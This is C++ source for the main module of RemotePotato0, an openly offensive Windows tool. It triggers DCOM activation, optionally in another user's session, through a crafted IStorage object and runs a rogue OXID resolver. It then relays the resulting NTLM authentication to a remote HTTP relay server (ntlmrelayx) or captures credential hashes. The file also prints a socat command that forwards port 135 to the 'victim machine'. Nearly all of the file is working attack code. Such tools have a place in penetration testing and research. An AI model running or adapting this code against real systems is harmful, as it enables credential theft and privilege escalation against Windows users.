#include "Windows.h"
#include "stdio.h"
#include "HTTPCrossProtocolRelay.h"
#include "RPCCaptureServer.h"
#include "RogueOxidResolver.h"
#include "IStorageTrigger.h"
#include "RogueOxidResolver_h.h"
#include "IStandardActivator_h.h"
#include <system_error>

int g_sessionID=-1;
wchar_t* g_rpcRelayServerListeningPort;
wchar_t* rogueOxidResolverIp;
wchar_t* rogueOxidResolverPort;
bool juicyPotatoCompatible;

BOOL g_SuccessTrigger = FALSE;

DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam);
DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam);
DWORD WINAPI ThreadRpcServerCaptureCredsHash(LPVOID lpParam);
void TriggerDCOM(wchar_t*);
void TriggerDCOMWithSessionID(wchar_t*);
void usage();
BOOL IsJuicyPotatoCompatible();

typedef NTSTATUS(NTAPI* pRtlGetVersion)(OSVERSIONINFOEX* lpVersionInformation);

struct THREAD_PARAMETERS
{
	wchar_t* remoteHTTPRelayServerIp;
	wchar_t* remoteHTTPRelayServerPort;
	wchar_t* rpcServerIpReflection;
	wchar_t* rpcServerPortReflection;
	wchar_t* rpcRelayServerListeningPort;
};


int wmain(int argc, wchar_t** argv)
{
	int fModule = -1;
	wchar_t defaultRemoteHTTPRelayServerPort[] = L"80";
	wchar_t defaultRogueOxidResolverIp[] = L"127.0.0.1";
	wchar_t defaultRogueOxidResolverPort[] = L"9999";
	wchar_t defaultRpcRelayServerListeningPort[] = L"9997";
	wchar_t defaultClsid[] = L"{5167B42F-C111-47A1-ACC4-8EABE61B0B54}";
	wchar_t* remoteHTTPRelayServerIp = NULL;
	wchar_t* remoteHTTPRelayServerPort = defaultRemoteHTTPRelayServerPort;
	wchar_t* rpcRelayServerListeningPort = defaultRpcRelayServerListeningPort;
	wchar_t* clsid = defaultClsid;
	rogueOxidResolverIp = defaultRogueOxidResolverIp;
	rogueOxidResolverPort = defaultRogueOxidResolverPort;

	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{

		switch (argv[cnt][1])
		{

		case 'm':
			++cnt;
			--argc;
			fModule = _wtoi(argv[cnt]);
			break;

		case 'r':
			++cnt;
			--argc;
			remoteHTTPRelayServerIp = argv[cnt];
			break;

		case 't':
			++cnt;
			--argc;
			remoteHTTPRelayServerPort = argv[cnt];
			break;

		case 'l':
			++cnt;
			--argc;
			rpcRelayServerListeningPort = argv[cnt];
			break;

		case 's':
			++cnt;
			--argc;
			g_sessionID = _wtoi(argv[cnt]);
			break;

		case 'c':
			++cnt;
			--argc;
			clsid = argv[cnt];
			break;

		case 'p':
			++cnt;
			--argc;
			rogueOxidResolverPort = argv[cnt];
			break;

		case 'x':
			++cnt;
			--argc;
			rogueOxidResolverIp = argv[cnt];
			break;

		case 'h':
			usage();
			exit(0);

		default:
			printf("Wrong Argument: %S\n", argv[cnt]);
			usage();
			exit(-1);
		}
		++cnt;
		--argc;
	}
	
	if (fModule == -1) {
		usage();
		exit(-1); 
	}
		
	THREAD_PARAMETERS threads_params = {};
	threads_params.remoteHTTPRelayServerIp = remoteHTTPRelayServerIp;
	threads_params.remoteHTTPRelayServerPort = remoteHTTPRelayServerPort;
	threads_params.rpcServerIpReflection = defaultRogueOxidResolverIp;
	threads_params.rpcServerPortReflection = rogueOxidResolverPort;
	threads_params.rpcRelayServerListeningPort = rpcRelayServerListeningPort;
	HANDLE hThreadServer;

	if (fModule == 0 || fModule == 2) {
		g_rpcRelayServerListeningPort = rpcRelayServerListeningPort;
		CreateThread(NULL, 0, ThreadRogueOxidResolver, (LPVOID)rogueOxidResolverPort, 0, NULL);
		if (IsJuicyPotatoCompatible()) {
			printf("[*] Detected a Windows Server version compatible with JuicyPotato. RogueOxidResolver can be run locally on 127.0.0.1\n");
			juicyPotatoCompatible = true;
		}
		else
		{
			if (rogueOxidResolverIp == defaultRogueOxidResolverIp) {
				printf("[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.\n");
				printf("[!] Example Network redirector: \n\tsudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
				exit(-1);
			}
			printf("[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on %S to your victim machine on port %S\n", remoteHTTPRelayServerIp, rogueOxidResolverPort);
			printf("[*] Example Network redirector: \n\tsudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
			juicyPotatoCompatible = false;
		}
	}
	else {
		// using the system oxid resolver to forge rpc packet template
		threads_params.rpcServerIpReflection = (wchar_t*)L"127.0.0.1";
		threads_params.rpcServerPortReflection = (wchar_t*)L"135";
	}

	if (fModule == 0 || fModule == 1) {
		if (remoteHTTPRelayServerIp == NULL)
		{
			printf("[!] Remote HTTP Relay server ip must be set in module 0 and 1, set it with the -r flag.\n");
			exit(-1);
		}
		printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteHTTPRelayServerIp);
		hThreadServer = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
	}
	else {
		printf("[*] Starting the RPC server to capture the credentials hash from the user authentication!!\n");
		hThreadServer = CreateThread(NULL, 0, ThreadRpcServerCaptureCredsHash, (LPVOID)& threads_params, 0, NULL);
	}

	if (fModule == 0 || fModule == 2) {
		if (g_sessionID == -1)
			TriggerDCOM(clsid);
		else
			TriggerDCOMWithSessionID(clsid);
	}

	WaitForSingleObject(hThreadServer, INFINITE);
	return 0;
}

DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam)
{
	size_t pReturnValue;
	char listening_port[6];
	wcstombs_s(&pReturnValue, listening_port, 5, (const wchar_t*)lpParam, 5);
	RunRogueOxidResolver(listening_port);
	return 0;
}

DWORD WINAPI ThreadRpcServerCaptureCredsHash(LPVOID lpParam) {
	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
	DoRpcServerCaptureCredsHash(thread_params->rpcServerIpReflection, thread_params->rpcServerPortReflection, thread_params->rpcRelayServerListeningPort);
	return 0;
}

DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam) {
	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
	DoHTTPCrossProtocolRelay(thread_params->remoteHTTPRelayServerIp, thread_params->remoteHTTPRelayServerPort, thread_params->rpcServerIpReflection, thread_params->rpcServerPortReflection, thread_params->rpcRelayServerListeningPort);
	return 0;
}

void TriggerDCOM(wchar_t* clsid_string)
{
	CoInitialize(NULL);

	//Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, TRUE, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(clsid_string, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	if (!g_SuccessTrigger)
	{
		if (status == CO_E_BAD_PATH)
			printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
		else
			printf("[!] Error. Trigger DCOM failed with status: 0x%x\n", status);
		exit(-1);
	}
	//debug
	//printf("[*] CoGetInstanceFromIStorage status:0x%x\n", status);
	CoUninitialize();
}

void TriggerDCOMWithSessionID(wchar_t* clsid_string)
{
	CoInitialize(NULL);

	//Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, TRUE, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(clsid_string, &clsid);
	CLSID tmp, CLSID_ComActivator;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	//ComActivator CLSID
	CLSIDFromString(OLESTR("{0000033C-0000-0000-c000-000000000046}"), &CLSID_ComActivator);

	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;
	IStandardActivator* pComAct;
	HRESULT r = CoCreateInstance(CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER, IID_IStandardActivator, (LPVOID*)&pComAct);
	//printf("CoCreate=%d\n", r);
	ISpecialSystemProperties* pSpecialProperties = NULL;
	//printf("start query inter\n");
	r = pComAct->QueryInterface(IID_ISpecialSystemProperties, (void**)& pSpecialProperties);
	//printf("query inter: %d\n", r);
	//printf("start set session");
	r = pSpecialProperties->SetSessionId(g_sessionID, 0, 1);
	//printf("set session: %d\n", r);
	printf("[*] Spawning COM object in the session: %d\n", g_sessionID);
	printf("[*] Calling StandardGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	HRESULT status = pComAct->StandardGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	std::string message = std::system_category().message(status);
	//printf("Error: %s\n", message.c_str());
	//Call CoGetInstanceFromIStorage
	//printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	//HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	if (!g_SuccessTrigger)
	{
		if (status == CO_E_BAD_PATH)
			printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
		else
			printf("[!] Error. Trigger DCOM failed with status: 0x%x - %s\n", status, message.c_str());
		exit(-1);
	}
	//debug
	//printf("[*] CoGetInstanceFromIStorage status:0x%x\n", status);
	CoUninitialize();
}

BOOL IsJuicyPotatoCompatible() {
	OSVERSIONINFOEX Version;
	memset(&Version, 0x00, sizeof(Version));
	Version.dwOSVersionInfoSize = sizeof(Version);
	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
	RtlGetVersion(&Version);
	if (Version.dwMajorVersion <= 10 && Version.dwBuildNumber <= 17134)
		return true;
	return false;
}

void usage()
{
	printf("\n\n\tRemotePotato0\n\t@splinter_code & @decoder_it\n\n\n\n");
	printf("Mandatory args: \n"
		"-m module\n"
		"\tAllowed values:\n"
		"\t0 - Rpc2Http cross protocol relay server + potato trigger (default)\n"
		"\t1 - Rpc2Http cross protocol relay server\n"
		"\t2 - Rpc capture (hash) server + potato trigger\n"
		"\t3 - Rpc capture (hash) server\n"
	);

	printf("\n\n");
	printf("Other args: (someone could be mandatory and/or optional based on the module you use) \n"
		"-r Remote HTTP relay server ip\n"
		"-t Remote HTTP relay server port (Default 80)\n"
		"-x Rogue Oxid Resolver ip (default 127.0.0.1)\n"
		"-p Rogue Oxid Resolver port (default 9999)\n"
		"-l RPC Relay server listening port (Default 9997)\n"
		"-s Session id for the Cross Session Activation attack (default disabled)\n"
		"-c CLSID (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})\n"
	);
}